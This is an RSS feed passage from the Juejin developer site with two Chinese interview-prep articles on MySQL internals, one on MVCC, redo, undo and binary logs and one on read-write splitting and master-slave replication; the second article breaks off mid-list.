<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[大厂面试题MySQL解析：MVCC、Redolog、Undolog与Binlog的区别]]></title>    <link>https://juejin.cn/post/7574725286530089011</link>    <guid>https://juejin.cn/post/7574725286530089011</guid>    <pubDate>2025-11-21T05:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574725286530089011" data-draft-id="7574253222607241257" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大厂面试题MySQL解析：MVCC、Redolog、Undolog与Binlog的区别"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-21T05:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大厂面试题MySQL解析：MVCC、Redolog、Undolog与Binlog的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:07:15.000Z" title="Fri Nov 21 2025 05:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在MySQL数据库的面试中，常常会遇到关于事务、日志和一致性等方面的核心问题。理解和掌握这些概念是非常重要的，特别是当涉及到数据库的性能优化和故障恢复时。本文将详细解析MySQL中 <strong>MVCC</strong>、<strong>Redolog</strong>、<strong>Undolog</strong> 和 <strong>Binlog</strong> 的区别和作用。</p>
<h4 data-id="heading-0">1. <strong>MVCC（多版本并发控制）</strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1692580abf4929bd823fa06e7d79a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=5nwmb0xq8MLJjPAptZieZweUCN8%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h4>
<p><strong>MVCC</strong>（Multi-Version Concurrency Control）是一种用于实现并发控制的技术，通过保持数据的多个版本来避免锁争用和提升并发性。它主要用于实现<strong>事务的隔离性</strong>。</p>
<ul>
<li><strong>MVCC的工作原理</strong>：<br/>
- MySQL通过在每一行记录中存储两个隐藏字段：<code>DB_TRX_ID</code>（事务ID）和<code>DB_ROLL_PTR</code>（指向undo日志的指针）。<br/>
- 在每次读取数据时，InnoDB引擎会根据<strong>事务ID</strong>来判断哪个版本的数据是当前事务能看到的有效数据。如果某一事务在读取时，另一事务对该数据进行了修改，MVCC保证读取的数据是该事务启动时可见的历史版本。<br/>
</li>
<li><strong>作用</strong>： <br/>
- 提供了<strong>事务隔离性</strong>，确保多个事务并发执行时不会互相干扰，避免读取脏数据。<br/>
- 通过不加锁读取，可以提升数据库的并发性。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc8d57d160c243e191b45681c870f0dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=CPGpOkFAhkIs5lIaoHtcyCv8gaM%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</li>
</ul>
<hr/>
<h4 data-id="heading-1">2. <strong>Redolog（重做日志）</strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88b95e370ed749308e52a44c3e4ddd59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=CM9zJOmx9%2BBsD25MTy%2FcLbPXheU%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h4>
<p><strong>Redolog</strong> 是InnoDB存储引擎的一种日志机制，旨在提供数据恢复功能。它记录了事务对数据库的所有修改操作，并且是持久化的。在MySQL中，Redolog属于<strong>事务日志</strong>的一种。</p>
<ul>
<li>
<p><strong>Redolog的工作原理</strong>：<br/>
- 每次事务提交前，InnoDB会先将事务修改操作写入到<strong>Redolog缓冲区</strong>（内存），然后再刷写到磁盘。<br/>
- Redolog确保即使数据库崩溃，只要事务已经提交，对应的修改就不会丢失。系统会根据Redolog重新执行提交的事务。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad37c561cf1a4d6eb8e43c9284c48a07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=kGAEqYA%2B6BUt1QssBnLWKNLI3RE%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
</li>
<li>
<p><strong>作用</strong>：<br/>
- 保证了数据的<strong>持久性</strong>（Durability），即使系统崩溃或发生其他故障，只要事务提交，就能通过Redolog恢复数据。<br/>
- <strong>日志顺序写入</strong>：在高并发的情况下，Redolog采用顺序写入的方式，极大地提高了写入性能。</p>
</li>
</ul>
<hr/>
<h4 data-id="heading-2">3. <strong>Undolog（回滚日志）</strong></h4>
<p><strong>Undolog</strong>（Undo日志）是用来支持事务回滚的日志。它记录了事务对数据的修改操作，确保如果事务需要回滚时，可以将数据恢复到修改前的状态。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aafce4a3b74c40afa63944aaee3770b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=HHjPVHX0z4Y8dbW311IxXQhPKSg%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
<ul>
<li>
<p><strong>Undolog的工作原理</strong>：<br/>
- 当事务开始修改数据时，InnoDB会生成Undo日志，这些日志记录了修改之前的数据值（即修改前的快照）。<br/>
- 如果事务出现异常或需要回滚，InnoDB会通过Undolog将修改恢复到原来的状态。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c432117c9942ae9d604f489eb2c914~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=Zh1NpELtLLjpZw2woBSpHVkqdzE%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
</li>
<li>
<p><strong>作用</strong>：<br/>
- 支持事务的<strong>原子性</strong>（Atomicity），保证即使事务执行中发生错误或需要回滚，所有已做的修改都会被撤销，数据库状态恢复到事务开始之前。<br/>
- 实现MVCC：每个事务都有自己的一组Undo日志记录，通过这些Undo日志可以查询历史版本的数据。</p>
</li>
</ul>
<hr/>
<h4 data-id="heading-3">4. <strong>Binlog（二进制日志）</strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bef2e3821be436b9a781af16f1bc22a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306435&amp;x-signature=yDY1PILN8Bri4GwcBdhmwByrv18%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h4>
<p><strong>Binlog</strong>是MySQL的二进制日志文件，用于记录所有修改数据库数据的操作。它主要用于<strong>数据恢复</strong>、<strong>主从复制</strong>和<strong>增量备份</strong>。</p>
<ul>
<li>
<p><strong>Binlog的工作原理</strong>：<br/>
- 每次数据库发生增、删、改等操作时，MySQL都会将这些操作记录到Binlog中。Binlog是按顺序记录的，并且它不会记录查询操作。<br/>
- Binlog存储的是<strong>逻辑日志</strong>，记录的是SQL语句本身（例如<code>INSERT</code>、<code>UPDATE</code>等），可以用来恢复或重放数据库操作。</p>
</li>
<li>
<p><strong>作用</strong>：<br/>
- 支持<strong>数据库恢复</strong>：Binlog记录了数据库的所有修改操作，可以用来恢复丢失的数据或回滚数据。<br/>
- 支持<strong>主从复制</strong>：通过将主库的Binlog同步到从库，从库可以重放这些日志来保持数据同步。<br/>
- 支持<strong>增量备份</strong>：可以利用Binlog进行增量备份，只备份自上次备份以来的变化。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">5. <strong>MVCC、Redolog、Undolog和Binlog的区别</strong></h3>






















































<table><thead><tr><th>特性/日志类型  </th><th><strong>MVCC</strong>                      </th><th><strong>Redolog</strong>                    </th><th><strong>Undolog</strong>                    </th><th><strong>Binlog</strong>                    </th></tr></thead><tbody><tr><td><strong>定义</strong>        </td><td>多版本并发控制，用于实现事务隔离性</td><td>记录事务对数据库的修改操作，确保持久性</td><td>记录事务修改前的数据，用于支持回滚</td><td>记录所有数据库修改操作，用于备份和复制</td></tr><tr><td><strong>记录内容</strong>    </td><td>数据版本、事务ID              </td><td>数据修改的操作日志              </td><td>修改前的数据（回滚操作）      </td><td>数据修改的SQL语句              </td></tr><tr><td><strong>存储位置</strong>    </td><td>数据行中                      </td><td>磁盘上的Redolog文件            </td><td>磁盘上的Undo日志              </td><td>磁盘上的Binlog文件            </td></tr><tr><td><strong>作用</strong>        </td><td>支持并发控制和事务隔离性      </td><td>保证事务持久性，崩溃恢复        </td><td>支持事务回滚，保证原子性        </td><td>数据恢复、主从复制、增量备份  </td></tr><tr><td><strong>写入顺序</strong>    </td><td>非顺序写入                    </td><td>顺序写入                        </td><td>顺序写入                      </td><td>顺序写入                      </td></tr><tr><td><strong>是否可回滚</strong>  </td><td>否                            </td><td>否                              </td><td>是                            </td><td>否                            </td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">总结</h3>
<ul>
<li><strong>MVCC</strong> 通过维护多个版本的数据，确保事务的并发性和隔离性，避免了传统的锁机制。</li>
<li><strong>Redolog</strong> 是事务持久性的保证，通过记录事务修改操作，确保系统崩溃后数据不会丢失。</li>
<li><strong>Undolog</strong> 提供了事务回滚的功能，确保事务的原子性，在需要回滚时恢复到事务开始前的状态。</li>
<li><strong>Binlog</strong> 主要用于备份、恢复和主从复制，记录所有修改数据的操作。</li>
</ul>
<p>这四种日志机制是MySQL数据库保障数据一致性、可恢复性、并发控制和事务支持的重要工具，各有不同的作用和特点。在面试中，理解它们的原理和实际应用场景是非常重要的。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL面试题解析：MySQL读写分离与主从同步]]></title>    <link>https://juejin.cn/post/7574775334680903690</link>    <guid>https://juejin.cn/post/7574775334680903690</guid>    <pubDate>2025-11-21T05:07:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574775334680903690" data-draft-id="7574286569037873215" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL面试题解析：MySQL读写分离与主从同步"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-21T05:07:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL面试题解析：MySQL读写分离与主从同步
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:07:37.000Z" title="Fri Nov 21 2025 05:07:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在MySQL数据库的面试中，面试官常常会问到数据库的高可用性架构设计，尤其是<strong>读写分离</strong>和<strong>主从同步</strong>。这些技术能够帮助提升数据库的性能和可扩展性，特别是在高并发的场景下。</p>
<p>本文将详细解释什么是MySQL的<strong>读写分离</strong>和<strong>主从同步</strong>，它们的工作原理，以及如何在实际应用中使用它们。</p>
<hr/>
<h3 data-id="heading-0">1. <strong>MySQL读写分离</strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fdd6d1eed4148dc96d89583f4e678ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306456&amp;x-signature=ZbdI8hnxIzcBryz2PawcrGqYVM8%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h3>
<h4 data-id="heading-1"><strong>定义</strong></h4>
<p>MySQL的<strong>读写分离</strong>（Read-Write Splitting）是一种架构设计，通过将数据库的读请求和写请求分开处理，从而提高数据库的性能和扩展性。在读写分离架构中，通常会配置一个主数据库和多个从数据库：<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/234203349aa749bca1109e754c4fa47d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764306456&amp;x-signature=QaNkLCAu88%2BA9Aprf52R0nhtEgI%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</p>
<ul>
<li><strong>主库</strong>：负责处理写请求（如INSERT、UPDATE、DELETE等）。</li>
<li><strong>从库</strong>：负责处理读请求（如SELECT）。从库会定期同步主库的数据，以确保数据的一致性。</li>
</ul>
<h4 data-id="heading-2"><strong>工作原理</strong></h4>
<ul>
<li><strong>主库和从库的关系</strong>：主库执行写操作后，会将这些操作记录到<strong>Binlog</strong>（二进制日志）中，从库会实时或定期同步主库的Binlog日志，将这些操作应用到自己的数据库中，从而保持与主库的数据一致性。</li>
<li><strong>读写请求分离</strong>：应用层通常会通过某种方式（例如中间件或数据库代理）将读请求路由到从库，而写请求则直接发送到主库。这样，主库负责写操作，从库则负责读操作。</li>
</ul>
<h4 data-id="heading-3"><strong>优势</strong></h4>
<ul>
<li><strong>提升性能</strong>：通过将读操作分发到多个从库，可以有效减轻主库的压力，提高系统的整体吞吐量。</li>
<li><strong>负载均衡</strong>：在多个从库中分发读请求，有助于平衡数据库的负载，避免单个数据库实例过载。</li>
<li><strong>高可用性</strong>：在主库出现故障时，可以通过将某个从库提升为新的主库来实现故障恢复，提升系统的可用性。</li>
</ul>
<h4 data-id="heading-4"><strong>缺点</strong></h4>
<ul>
<li><strong>数据延迟</strong>：主库写入数据后，从库需要一段时间来同步这些数据。因此，从库的数据可能会有一定的延迟。</li>
<li><strong>一致性问题</strong>：由于从库有延迟，某些时刻从库中的数据可能不是最新的。这在某些场景下可能引起一致性问题，特别是对于对一致性要求较高的应用。</li>
</ul>
<h4 data-id="heading-5"><strong>实现方式</strong></h4>
<p>MySQL的读写分离通常可以通过以下方式实现：</p>
<ul>
<li><strong>MySQL Proxy</strong>：例如使用ProxySQL、MaxScale等中间件来实现读写分离。这些工具会自动将读请求发送到从库，而写请求发送到主库。</li>
<li><strong>应用层控制</strong>：在应用层，开发人员可以手动将读写请求路由到不同的数据库实例。</li>
<li><strong>MySQL Router</strong>：MySQL官方提供的路由工具，用于将读请求路由到从库，写请求路由到主库。</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. <strong>MySQL主从同步</strong></h3>
<h4 data-id="heading-7"><strong>定义</strong></h4>
<p><strong>主从同步</strong>（Master-Slave Replication）是MySQL中的一种数据同步机制，允许多个MySQL服务器通过复制技术保持数据一致性。主库（Master）接受所有写请求，从库（Slave）则从主库同步数据，通常用于提高数据库的读取性能和可用性。</p>
<h4 data-id="heading-8"><strong>工作原理</strong></h4>
<ol>
<li><strong>Binlog</strong>：主库在处理每一个写请求时，将操作记录到二进制日志（Binlog）中。</li>
<li><strong>IO线程</strong>：从库的I/O线程会从主库获取最新的Binlog，并将其存储到自己的中继日志（Relay Log）中。</li>
<li><strong>SQL线程</strong>：从库的SQL线程会读取中继日志，执行日志中记录的SQL语句，从而使得从库的数据与主库保持一致。</li>
</ol>
<h4 data-id="heading-9"><strong>同步方式</strong></h4>
<ul>
<li><strong>异步复制</strong>：在异步复制模式下，主库在提交事务时不会等待从库的确认。也就是说，主库先提交事务，再将其写入Binlog，从库则会在稍后同步这些日志。这种方式可能导致主库和从库之间的数据略有延迟，但性能较高。<br/>
</li>
<li><strong>半同步复制</strong>：在半同步复制模式下，主库在提交事务时会等待至少一个从库确认收到日志后才会提交事务。这种方式比异步复制更能保证主从数据的一致性，但性能略逊一筹。<br/>
</li>
<li><strong>同步复制</strong>：在同步复制模式下，主库和所有从库都必须确认事务提交才能返回。这种方式能保证强一致性，但对性能有较大影响。</li>
</ul>
<h4 data-id="heading-10"><strong>优势</strong></h4>
<ul>
<li><strong>数据冗余</strong>：主从同步提供了数据冗余，防止因主库故障导致数据丢失。</li>
<li><strong>提高读取性能</strong>：通过将读取请求分配到多个从库，能分担主库的负载，从而提升数据库的性能。</li>
